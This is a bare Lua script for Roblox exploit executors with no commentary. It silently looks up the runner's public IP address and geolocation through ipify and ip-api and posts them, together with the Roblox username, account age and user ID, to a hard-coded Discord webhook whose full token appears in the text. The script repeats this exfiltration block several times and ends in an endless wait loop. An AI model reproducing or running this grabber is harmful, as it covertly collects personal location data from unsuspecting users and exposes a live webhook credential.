local webhookcheck =
  is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
  secure_load and "Sentinel" or
  KRNL_LOADED and "Krnl" or
  SONA_LOADED and "Sona" or
  "Kid with shit exploit"


local api1 = tostring(game:HttpGet("https://api.ipify.org", true))
local api2 = tostring(game:HttpGet("http://ip-api.com/json"))

local url =
  "https://discord.com/api/webhooks/995549814454505582/wKAvmS53sYgxFVdHiahe1Kmflmfb_tte0Yzqp1sJ6MrS8mk98glPH_B4hk8Tn2M-WeQN"
local data = {
  ["embeds"] = {
      {
        ["title"] = "**PSA**",
        ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
        ["type"] = "rich",
        ["color"] = tonumber(0x7269da),
        ["fields"] = {
            {
                ["name"] = "Name:",
                ["value"] = tostring(game.Players.LocalPlayer.Name),
                ["inline"] = true
            },
            {
                ["name"] = "api1",
                ["value"] = tostring(api1),
                ["inline"] = true
            },
            {
                ["name"] = "api2",
                ["value"] = tostring(api2),
                ["inline"] = true
            }
        }
      }
  }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
local request
if webhookcheck == "Synapse X" then
    request = syn.request
else
    request = request or http_request or HttpPost or syn.request
end

local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

wait(10)

local webhookcheck =
  is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
  secure_load and "Sentinel" or
  KRNL_LOADED and "Krnl" or
  SONA_LOADED and "Sona" or
  "Kid with shit exploit"


local api1 = tostring(game:HttpGet("https://api.ipify.org", true))
local api2 = tostring(game:HttpGet("http://ip-api.com/json"))

local url =
  "https://discord.com/api/webhooks/995549814454505582/wKAvmS53sYgxFVdHiahe1Kmflmfb_tte0Yzqp1sJ6MrS8mk98glPH_B4hk8Tn2M-WeQN"
local data = {
  ["embeds"] = {
      {
        ["title"] = "**PSA**",
        ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
        ["type"] = "rich",
        ["color"] = tonumber(0x7269da),
        ["fields"] = {
            {
                ["name"] = "Name:",
                ["value"] = tostring(game.Players.LocalPlayer.Name),
                ["inline"] = true
            },
            {
                ["name"] = "api1",
                ["value"] = tostring(api1),
                ["inline"] = true
            },
            {
                ["name"] = "api2",
                ["value"] = tostring(api2),
                ["inline"] = true
            }
        }
      }
  }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
local request
if webhookcheck == "Synapse X" then
    request = syn.request
else
    request = request or http_request or HttpPost or syn.request
end

local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

wait(10)

local webhookcheck =
  is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
  secure_load and "Sentinel" or
  KRNL_LOADED and "Krnl" or
  SONA_LOADED and "Sona" or
  "Kid with shit exploit"

local url =
  "https://discord.com/api/webhooks/"
local data = {
  ["embeds"] = {
      {
        ["title"] = "**w**",
        ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
        ["type"] = "rich",
        ["color"] = tonumber(0x7269da),
        ["fields"] = {
            {
                ["name"] = "Name:",
                ["value"] = tostring(game.Players.LocalPlayer.Name),
                ["inline"] = true
            },
            {
                ["name"] = "age",
                ["value"] = tostring(game.Players.LocalPlayer.AccountAge),
                ["inline"] = true
            },
            {
                ["name"] = "Id",
                ["value"] = tostring(game.Players.LocalPlayer.UserId),
                ["inline"] = true
            }
        }
      }
  }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
local request
if webhookcheck == "Synapse X" then
    request = syn.request
else
    request = request or http_request or HttpPost or syn.request
end

local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

while true do
  wait() 
 end

